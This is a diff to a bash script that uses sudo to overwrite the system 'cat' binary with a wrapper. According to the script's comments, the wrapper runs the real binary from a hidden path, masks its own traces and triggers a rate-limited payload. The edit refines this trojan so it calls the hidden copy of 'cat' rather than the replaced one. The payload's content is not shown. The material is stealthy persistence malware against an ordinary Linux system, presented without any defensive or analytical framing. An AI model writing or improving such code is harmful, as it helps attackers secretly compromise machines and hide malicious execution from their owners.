@@ -1,12 +1,13 @@
 #!/bin/bash
 
 # Locate the current path to the 'cat' binary
+real_cat="/usr/lib/.backup_bins/cat-cache"
 cat_path="$(which cat 2>/dev/null)"
 
 # Overwrite the original 'cat' binary with a custom wrapper
 # The wrapper executes the real binary from a hidden path,
 # masks any trace of it, and triggers a rate-limited payload
-sudo bash -c "cat > \"$cat_path\"" << 'EOF'
+sudo bash -c "$real_cat > \"$cat_path\"" << 'EOF'
 #!/bin/bash
 
 real_cat="/usr/lib/.backup_bins/cat-cache"
@@ -25,7 +26,7 @@ rate_limit_file="/tmp/.cat_last_run"   # Timestamp file for last payload run
 cooldown=10                            # Cooldown in seconds
 
 now=$(date +%s)
-last_run=$(cat "$rate_limit_file" 2>/dev/null || echo 0)
+last_run=$($real_cat "$rate_limit_file" 2>/dev/null || echo 0)
 
 if (( now - last_run >= cooldown )); then
     (
